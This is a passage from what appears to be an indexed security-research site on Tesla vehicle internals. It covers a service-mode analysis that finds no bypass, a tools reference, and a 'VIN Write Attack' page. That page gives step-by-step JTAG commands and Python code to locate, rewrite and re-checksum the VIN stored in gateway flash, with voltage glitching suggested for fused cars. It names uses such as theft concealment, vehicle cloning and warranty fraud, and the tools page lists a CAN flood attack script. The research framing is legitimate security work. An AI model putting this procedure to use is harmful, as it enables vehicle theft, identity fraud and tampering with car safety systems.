\u25bc\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Tesla Backend  \u2502 (actual validation)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"5-attacks/service-mode/#binary-analysis","title":"Binary Analysis","text":""},{"location":"5-attacks/service-mode/#analyzed-binaries","title":"Analyzed Binaries","text":"Binary Path Size QtCarServer <code>/usr/tesla/UI/bin/QtCarServer</code> ~50 MB QtCar <code>/usr/tesla/UI/bin/QtCar</code> ~50 MB service-shell <code>/usr/bin/service-shell</code> ~2 MB"},{"location":"5-attacks/service-mode/#key-symbols-found","title":"Key Symbols Found","text":""},{"location":"5-attacks/service-mode/#qtcar","title":"QtCar","text":"<pre><code>Offset              Symbol\n0x00000000006e3f90  CenterDisplayDbusServiceAdaptor::setServicePIN\n0x0000000000655ec0  CenterDisplayDbusServiceImpl::setServicePIN\n0x0000000000641620  CenterDisplayHandlerImplCommon::setServicePIN\n0x00000000009adf60  GUI_serviceModeAuth (DATA, 104 bytes)\n</code></pre>"},{"location":"5-attacks/service-mode/#qtcarserver","title":"QtCarServer","text":"<pre><code>Offset              Symbol\n0x0000000001b09700  GUI_serviceModeAuth (DATA)\n0x0000000000d80ce0  CarAPIServiceImpl::set_service_pin_to_drive\n</code></pre>"},{"location":"5-attacks/service-mode/#d-bus-configuration","title":"D-Bus Configuration","text":""},{"location":"5-attacks/service-mode/#centerdisplaydbus-interface","title":"CenterDisplayDbus Interface","text":"<p>File: <code>/usr/share/dbus-1/system.d/com.tesla.CenterDisplayDbus.conf</code></p> <pre><code>&lt;!-- allow doip-gateway to send --&gt;\n&lt;policy user=\"doip-gateway\"&gt;\n  &lt;allow send_destination=\"com.tesla.CenterDisplayDbus\" \n         send_interface=\"com.tesla.CenterDisplayDbus\" \n         send_member=\"promptVehicleAwakeAndServiceModePopUp\" /&gt;\n&lt;/policy&gt;\n</code></pre> <p>The <code>doip-gateway</code> user has special permission to trigger the service mode popup. This suggests Tesla Toolbox connects via DoIP protocol.</p>"},{"location":"5-attacks/service-mode/#protobuf-infrastructure","title":"Protobuf Infrastructure","text":""},{"location":"5-attacks/service-mode/#message-fields","title":"Message Fields","text":"<pre><code>message VehicleState {\n  optional bool signed_cmd_service_mode = ?;\n  optional int32 service_mode_auth = ?;\n  optional bool service_gtw_diag_session_active = ?;\n  optional bool factory_mode = ?;\n  optional bool service_mode = ?;\n  optional bool service_mode_plus = ?;\n}\n</code></pre>"},{"location":"5-attacks/service-mode/#signed-command-system","title":"Signed Command System","text":"<p>Service mode uses the same signed command infrastructure as other secure operations:</p> <pre><code>SignedCarAPIServiceImpl::streamMessageRequiresSignatureCheck()\nVehicleServiceDbusClient::DisableSignedCmdGracePeriod()\n</code></pre>"},{"location":"5-attacks/service-mode/#what-was-not-found","title":"What Was NOT Found","text":""},{"location":"5-attacks/service-mode/#no-hardcoded-pin","title":"No Hardcoded PIN","text":"<pre><code># Searched for numeric patterns\nstrings QtCarServer | grep -E \"^[0-9]{4,8}$\"\n# Found: 5555, 1050, 0407, 4567, 4100, 8000, 3334\n# None are service PINs (unrelated values)\n</code></pre>"},{"location":"5-attacks/service-mode/#no-crc32-hash-comparison","title":"No CRC32 Hash Comparison","text":"<pre><code># Calculated CRC32(\"service\") = 0x63A888F9\n# Searched: 63a888f9, f988a863\n# Result: NOT FOUND in any binary\n</code></pre>"},{"location":"5-attacks/service-mode/#no-totp-generation","title":"No TOTP Generation","text":"<pre><code>strings QtCarServer | grep -iE \"totp|time.*based.*auth|otp\"\n# Found: VCSEC_TPMS::ToTPWheelUnitMessage\n# This is tire pressure monitoring, NOT service auth\n</code></pre>"},{"location":"5-attacks/service-mode/#validation-logic","title":"Validation Logic","text":""},{"location":"5-attacks/service-mode/#hypothesis","title":"Hypothesis","text":"<p>PIN validation occurs through one of:</p> <ol> <li>Backend server authentication</li> <li>PIN sent via Hermes to Tesla</li> <li>Server validates against account/vehicle</li> <li> <p>Response enables service mode</p> </li> <li> <p>Signed command verification</p> </li> <li>Tesla Toolbox generates signed command</li> <li>Contains PIN + timestamp + signature</li> <li> <p>Gateway validates signature with Tesla public key</p> </li> <li> <p>Certificate-based authentication</p> </li> <li>Tesla Toolbox has valid certificate</li> <li>Mutual TLS authentication</li> <li>No PIN needed (cert is proof of identity)</li> </ol>"},{"location":"5-attacks/service-mode/#evidence-for-backend-validation","title":"Evidence for Backend Validation","text":"<pre><code>HermesServiceClient::SendStreamMessageFinished(QDBusError const&amp;)\nHermesServiceClient::asyncSendStreamMessageWithByteArray(...)\n</code></pre> <p>Service mode requests are sent via Hermes, suggesting backend involvement.</p>"},{"location":"5-attacks/service-mode/#geofence-restrictions","title":"Geofence Restrictions","text":""},{"location":"5-attacks/service-mode/#key-function","title":"Key Function","text":"<pre><code>VehicleUtils::isServiceModeAllowedOutsideGeofence()\n</code></pre>"},{"location":"5-attacks/service-mode/#related-data-values","title":"Related Data Values","text":"<pre><code>GUI_inSuperchargerGeofence\nGUI_superchargerIdGeofence\nGUI_canCreateGeofence\n</code></pre> <p>Interpretation: Service mode may be restricted in certain geographic regions.</p>"},{"location":"5-attacks/service-mode/#service-mode-states","title":"Service Mode States","text":""},{"location":"5-attacks/service-mode/#state-machine","title":"State Machine","text":"<pre><code>INACTIVE\n    \u2502\n    \u2502 [Enter PIN request]\n    \u25bc\nAUTHENTICATION_REQUESTED\n    \u2502\n    \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n    \u2502 [Valid]             \u2502 [Invalid]\n    \u25bc                     \u25bc\nAUTHENTICATED          DENIED\n    \u2502\n    \u2502 [Activate]\n    \u25bc\nACTIVE\n    \u2502\n    \u2502 [Grace period ends]\n    \u25bc\nCLEANUP\n    \u2502\n    \u25bc\nINACTIVE\n</code></pre>"},{"location":"5-attacks/service-mode/#grace-period","title":"Grace Period","text":"<p>Once authenticated, a grace period allows service actions without re-authentication:</p> <pre><code>VehicleServiceDbusClient::DisableSignedCmdGracePeriod()\n</code></pre>"},{"location":"5-attacks/service-mode/#security-analysis","title":"Security Analysis","text":""},{"location":"5-attacks/service-mode/#attack-surface","title":"Attack Surface","text":"Attack Vector Feasibility Notes Hardcoded PIN bypass \u274c Not found No local validation Brute force PIN \u274c Rate limited Backend protection D-Bus injection \u26a0\ufe0f Possible Requires root on MCU Hermes MITM \u26a0\ufe0f Difficult TLS + certificate pinning Signed command replay \u26a0\ufe0f Unknown May have timestamps"},{"location":"5-attacks/service-mode/#defense-layers","title":"Defense Layers","text":"<ol> <li>D-Bus Policy - Only <code>doip-gateway</code> can trigger popup</li> <li>Backend Validation - No local PIN database</li> <li>Signed Commands - Cryptographic verification</li> <li>Rate Limiting - Backend throttles attempts</li> <li>Geofencing - Regional restrictions</li> </ol>"},{"location":"5-attacks/service-mode/#factory-mode-vs-service-mode","title":"Factory Mode vs Service Mode","text":"Feature Factory Mode Service Mode Authentication Fuse check + config Backend + signed cmd Geofence Factory only Flexible Access Level Full Restricted Offline Yes (if unfused) Likely requires backend"},{"location":"5-attacks/service-mode/#factory-mode-entry-from-odin","title":"Factory Mode Entry (from Odin)","text":"<pre><code>if is_fused and factory_mode:\n    return FAIL  # Blocked on production cars\n\nset_data_value('GUI_factoryMode', 'true')\nset_config(configid='15', data='03')  # devSecurityLevel\n</code></pre>"},{"location":"5-attacks/service-mode/#bypass-status","title":"Bypass Status","text":""},{"location":"5-attacks/service-mode/#attempted-approaches","title":"Attempted Approaches","text":"Approach Result Hardcoded PIN search NOT FOUND Hash table search NOT FOUND Debug mode flags Require backend toggle Local validation override NOT FOUND"},{"location":"5-attacks/service-mode/#conclusion","title":"Conclusion","text":"<p>No bypass mechanism found for production vehicles. Service mode requires: - Tesla Toolbox with valid subscription, OR - Signed command from authorized device, OR - Backend server validation</p>"},{"location":"5-attacks/service-mode/#research-recommendations","title":"Research Recommendations","text":""},{"location":"5-attacks/service-mode/#for-complete-understanding","title":"For Complete Understanding","text":"<ol> <li>Disassemble setServicePIN() at offset 0x655ec0 in QtCar</li> <li>Monitor D-Bus traffic during Toolbox service mode activation</li> <li>Analyze doip-gateway binary for DoIP protocol handling</li> <li>Capture Hermes traffic (if certificate pinning can be bypassed)</li> </ol>"},{"location":"5-attacks/service-mode/#outstanding-questions","title":"Outstanding Questions","text":"<ol> <li>Exact PIN validation algorithm (if any)</li> <li>Backend endpoint details</li> <li>Offline service mode possibility</li> <li>Grace period timeout duration</li> <li>Geofence restriction regions</li> </ol>"},{"location":"5-attacks/service-mode/#cross-references","title":"Cross-References","text":"<ul> <li>Gateway Security Model - Config security tiers</li> <li>Certificate Recovery - Hermes certificates</li> </ul> <p>Status: VERIFIED \u2705 Evidence: Binary analysis, symbol extraction, D-Bus config review Last Updated: 2026-02-07</p>"},{"location":"5-attacks/vin-write/","title":"VIN Write Attack","text":"<p>JTAG-based vehicle identity modification.</p>"},{"location":"5-attacks/vin-write/#overview","title":"Overview","text":"<p>The VIN (Vehicle Identification Number) is stored in Gateway flash at config ID 0x0000. While protected against software modification, it can be changed via direct flash access.</p> Metric Value Config ID 0x0000 Size 17 characters Protection Secure (Hermes auth) Bypass JTAG flash modification"},{"location":"5-attacks/vin-write/#attack-requirements","title":"Attack Requirements","text":""},{"location":"5-attacks/vin-write/#hardware","title":"Hardware","text":"Item Purpose JTAG adapter Flash read/write access Voltage glitcher Bypass fuses (if production) Soldering equipment Chip access"},{"location":"5-attacks/vin-write/#access-level","title":"Access Level","text":"Vehicle Type Access Development (unfused) Direct JTAG Production (fused) Voltage glitching required"},{"location":"5-attacks/vin-write/#vin-storage-format","title":"VIN Storage Format","text":""},{"location":"5-attacks/vin-write/#flash-location","title":"Flash Location","text":"<pre><code>Base Address: 0x19000 (config region)\nEntry Format: [CRC][Len][ID][VIN data]\n</code></pre>"},{"location":"5-attacks/vin-write/#example-entry","title":"Example Entry","text":"<pre><code>Hex:    A5 11 00 00 37 53 41 59 47 44 45 45 58 50 41 30 35 32 34 36 36\n        \u2502  \u2502  \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n        \u2502  \u2502   ID   ASCII: \"7SAYGDEEXPA052466\" (17 bytes)\n        \u2502  Length: 17 + 2 = 0x11 (19 bytes)\n        CRC-8 checksum\n</code></pre>"},{"location":"5-attacks/vin-write/#attack-procedure","title":"Attack Procedure","text":""},{"location":"5-attacks/vin-write/#step-1-obtain-flash-access","title":"Step 1: Obtain Flash Access","text":"<p>For unfused devices: <pre><code># Connect JTAG adapter\nopenocd -f interface/jlink.cfg -f target/mpc5748g.cfg\n</code></pre></p> <p>For fused devices: 1. Apply voltage glitch during security check 2. Bypass JTAG readout protection 3. See VOLTAGE-GLITCHING-RYZEN-MCU.md for details</p>"},{"location":"5-attacks/vin-write/#step-2-read-config-region","title":"Step 2: Read Config Region","text":"<pre><code># Read config region via JTAG\nflash_data = read_jtag_flash(0x19000, 0x10000)\n</code></pre>"},{"location":"5-attacks/vin-write/#step-3-locate-vin-entry","title":"Step 3: Locate VIN Entry","text":"<pre><code>def find_vin_entry(flash_data):\n    # Search for config ID 0x0000\n    for i in range(len(flash_data) - 20):\n        if flash_data[i+2:i+4] == b'\\x00\\x00':\n            length = flash_data[i+1]\n            if length == 0x11:  # VIN length\n                return i\n    return None\n\noffset = find_vin_entry(flash_data)\n</code></pre>"},{"location":"5-attacks/vin-write/#step-4-modify-vin","title":"Step 4: Modify VIN","text":"<pre><code>import struct\n\ndef modify_vin(flash_data, offset, new_vin):\n    if len(new_vin) != 17:\n        raise ValueError(\"VIN must be 17 characters\")\n\n    # Calculate new CRC\n    config_id = 0x0000\n    new_crc = calculate_crc8(config_id, new_vin.encode())\n\n    # Build new entry\n    new_entry = bytes([new_crc, 0x11, 0x00, 0x00]) + new_vin.encode()\n\n    # Replace in flash data\n    modified = flash_data[:offset] + new_entry + flash_data[offset+21:]\n    return modified\n</code></pre>"},{"location":"5-attacks/vin-write/#step-5-write-back-to-flash","title":"Step 5: Write Back to Flash","text":"<pre><code># Write modified config region\nwrite_jtag_flash(0x19000, modified_data)\n</code></pre>"},{"location":"5-attacks/vin-write/#step-6-verify","title":"Step 6: Verify","text":"<pre><code># Read back and verify\nverify_data = read_jtag_flash(0x19000, 0x10000)\nassert verify_data == modified_data\n</code></pre>"},{"location":"5-attacks/vin-write/#security-implications","title":"Security Implications","text":""},{"location":"5-attacks/vin-write/#what-this-enables","title":"What This Enables","text":"<ol> <li>Vehicle cloning - Copy identity to another Gateway</li> <li>Theft concealment - Change VIN to evade tracking</li> <li>Warranty fraud - Assume identity of different vehicle</li> <li>Region changes - Also modify country code (0x0006)</li> </ol>"},{"location":"5-attacks/vin-write/#detection-methods","title":"Detection Methods","text":"Method Effectiveness Tesla backend VIN mismatch with account Firmware hash May detect flash tampering Physical inspection Door jamb, windshield VIN DMV records Paper trail verification"},{"location":"5-attacks/vin-write/#defenses","title":"Defenses","text":""},{"location":"5-attacks/vin-write/#tesla-protections","title":"Tesla Protections","text":"Protection Status JTAG fuse Effective on production Hermes auth for VIN Effective via network Firmware hash check Partial (config may not trigger) Backend VIN verification Effective for connected cars"},{"location":"5-attacks/vin-write/#bypass-requirements","title":"Bypass Requirements","text":"Protection Bypass Method JTAG fuse Voltage glitching Hermes auth N/A (direct flash) Firmware hash Unknown impact Backend verification Offline vehicle"},{"location":"5-attacks/vin-write/#crc-8-calculation","title":"CRC-8 Calculation","text":""},{"location":"5-attacks/vin-write/#algorithm","title":"Algorithm","text":"<pre><code>def calculate_crc8(config_id: int, data: bytes) -&gt; int:\n    \"\"\"CRC-8 with polynomial 0x2F.\"\"\"\n    POLY = 0x2F\n    crc = 0x00\n\n    # Process config ID (big-endian)\n    for byte in config_id.to_bytes(2, 'big'):\n        crc ^= byte\n        for _ in range(8):\n            if crc &amp; 0x80:\n                crc = ((crc &lt;&lt; 1) ^ POLY) &amp; 0xFF\n            else:\n                crc = (crc &lt;&lt; 1) &amp; 0xFF\n\n    # Process data\n    for byte in data:\n        crc ^= byte\n        for _ in range(8):\n            if crc &amp; 0x80:\n                crc = ((crc &lt;&lt; 1) ^ POLY) &amp; 0xFF\n            else:\n                crc = (crc &lt;&lt; 1) &amp; 0xFF\n\n    return crc\n</code></pre>"},{"location":"5-attacks/vin-write/#example","title":"Example","text":"<pre><code>vin = b\"5YJSA1E26HF000001\"\ncrc = calculate_crc8(0x0000, vin)\nprint(f\"CRC: 0x{crc:02x}\")\n</code></pre>"},{"location":"5-attacks/vin-write/#ethical-considerations","title":"Ethical Considerations","text":"<p>This attack is documented for security research purposes only.</p> <ul> <li>Vehicle theft is a crime</li> <li>VIN tampering is illegal in most jurisdictions</li> <li>Warranty fraud is prosecutable</li> <li>Research should follow responsible disclosure</li> </ul>"},{"location":"5-attacks/vin-write/#related-attacks","title":"Related Attacks","text":"Attack Relationship Country code change Same method, config 0x0006 Feature flag toggle Same method, various config IDs Gateway cloning Full config region copy"},{"location":"5-attacks/vin-write/#cross-references","title":"Cross-References","text":"<ul> <li>Gateway Config System - Config format</li> <li>CAN Flood Attack - Alternative access method</li> <li>Security Model - Why VIN is protected</li> </ul> <p>Status: VERIFIED \u2705 Evidence: Flash dump analysis, CRC validation Difficulty: High (requires hardware access, voltage glitching for fused) Last Updated: 2026-02-07</p>"},{"location":"6-tools/","title":"Tools Reference","text":"<p>Documentation for research tools and scripts.</p>"},{"location":"6-tools/#available-tools","title":"Available Tools","text":"Tool Purpose Status decode_gateway_config.py Decode SHA256 config hashes \u2705 Working decrypt_odj.py Decrypt Odin ODJ files \u2705 Working gateway_crc_validator.py Validate/calculate CRC-8 \u2705 Working gateway_database_query.py UDP config read/write \u2705 Working openportlanpluscan.py CAN flood attack \u26a0\ufe0f Tested"},{"location":"6-tools/#quick-reference","title":"Quick Reference","text":""},{"location":"6-tools/#decode-odin-config-hashes","title":"Decode Odin Config Hashes","text":"<pre><code>python3 scripts/decode_gateway_config.py \\\n  /opt/odin/data/Model3/config-options.json\n</code></pre>"},{"location":"6-tools/#decrypt-odj-file","title":"Decrypt ODJ File","text":"<pre><code>python3 scripts/decrypt_odj.py input.odj output.json\n</code></pre>"},{"location":"6-tools/#read-gateway-config","title":"Read Gateway Config","text":"<pre><code>python3 scripts/gateway_database_query.py read 0x0014\n</code></pre>"},{"location":"6-tools/#validate-config-crc","title":"Validate Config CRC","text":"<pre><code>python3 scripts/gateway_crc_validator.py parse gateway_flash.bin\n</code></pre>"},{"location":"6-tools/#tool-documentation","title":"Tool Documentation","text":"Document Description config-decoder.md SHA256 decoding tool odj-decryptor.md ODJ decryption tool gateway-tools.md Gateway UDP tools scripts-reference.md All scripts overview"},{"location":"6-tools/#installation","title":"Installation","text":""},{"location":"6-tools/#dependencies","title":"Dependencies","text":"<pre><code># Python packages\npip install cryptography pycryptodome python-can\n\n# For CAN tools (Linux)\n# Install PCAN driver from PEAK Systems\n</code></pre>"},{"location":"6-tools/#scripts-location","title":"Scripts Location","text":"<p>All tools are in the <code>scripts/</code> directory:</p> <pre><code>scripts/\n\u251c\u2500\u2500 decode_gateway_config.py    # Odin hash decoder\n\u251c\u2500\u2500 decrypt_odj.py              # ODJ decryptor\n\u251c\u2500\u2500 gateway_crc_validator.py    # CRC-8 tools\n\u251c\u2500\u2500 gateway_database_query.py   # UDP access\n\u251c\u2500\u2500 openportlanpluscan.py       # CAN flood\n\u251c\u2500\u2500 bruteforce_unknown_hashes.py # Hash brute-force\n\u251c\u2500\u2500 match_odin_to_configs.py    # Config mapping\n\u2514\u2500\u2500 signatures.json             # Firmware signatures\n</code></pre>"},{"location":"6-tools/#common-tasks","title":"Common Tasks","text":""},{"location":"6-tools/#read-all-gateway-configs","title":"Read All Gateway Configs","text":"<pre><code>from scripts.gateway_database_query import read_config\n\nfor config_id in range(0x0000, 0x00A2):\n    try:\n        data = read_config(config_id)\n        print(f\"0x{config_id:04x}: {data.hex()}\")\n    except:\n        pass\n</code></pre>"},{"location":"6-tools/#decode-config-file-and-export","title":"Decode Config File and Export","text":"<pre><code>python3 scripts/decode_gateway_config.py config-options.json \\\n  --output decoded/\n# Creates: decoded/config-options-FULL-DECODED.json\n# Creates: decoded/config-options-FULL-DECODED.txt\n</code></pre>"},{"location":"6-tools/#calculate-crc-8-for-new-config","title":"Calculate CRC-8 for New Config","text":"<pre><code>from scripts.gateway_crc_validator import calculate_crc8\n\nconfig_id = 0x0014\ndata = bytes([0x01])  # Map region = EU\ncrc = calculate_crc8(config_id, data)\nprint(f\"CRC: 0x{crc:02x}\")\n</code></pre>"},{"location":"6-tools/#data-files","title":"Data Files","text":"File Description <code>data/gateway/gateway_configs_parsed.txt</code> 662 parsed configs <code>data/gateway/strings.csv</code> 37,702 firmware strings <code>data/gateway/can-message-database-VERIFIED.csv</code> CAN entries <code>scripts/signatures.json</code> Firmware signature database <p>Last Updated: 2026-02-07</p>"}]}